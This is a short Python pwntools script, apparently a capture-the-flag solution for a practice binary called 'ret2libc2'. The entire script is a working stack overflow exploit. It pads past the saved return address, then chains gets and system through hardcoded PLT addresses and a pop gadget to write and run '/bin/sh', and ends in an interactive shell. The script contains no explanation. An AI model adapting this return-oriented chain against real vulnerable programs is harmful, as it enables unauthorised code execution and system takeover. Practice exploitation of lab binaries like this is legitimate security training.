from pwn import *



gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
offset = 0x6c + 4
payload = flat(
    [b'a' * offset, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
    
sh = process('./ret2libc2')
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
